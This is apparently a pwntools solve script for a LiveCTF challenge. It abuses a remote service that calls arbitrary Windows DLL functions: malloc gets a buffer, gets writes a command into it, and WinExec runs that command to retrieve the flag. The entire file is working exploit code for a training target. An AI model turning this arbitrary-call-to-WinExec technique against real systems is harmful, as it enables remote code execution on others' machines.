#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

def arb_call(dll, func, arg):

  sleep(0.1)
  io.sendlineafter(b"?\r\n", dll)
  sleep(0.1)
  io.sendlineafter(b"?\r\n", func)
  sleep(0.1)
  io.sendlineafter(b"?\r\n", arg)
  sleep(0.1)

  return

arb_call(b"msvcrt.dll", b"malloc", b"40")
chunk_addr = int(io.recvuntil(b"\r\nWhich", drop=True).split(b": ")[1],16)

arb_call(b"msvcrt.dll", b"gets", str(chunk_addr).encode())

sleep(3)

io.sendline(b"./submitter\x00")

arb_call(b"kernel32.dll", b"WinExec", str(chunk_addr).encode())

sleep(1)

flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
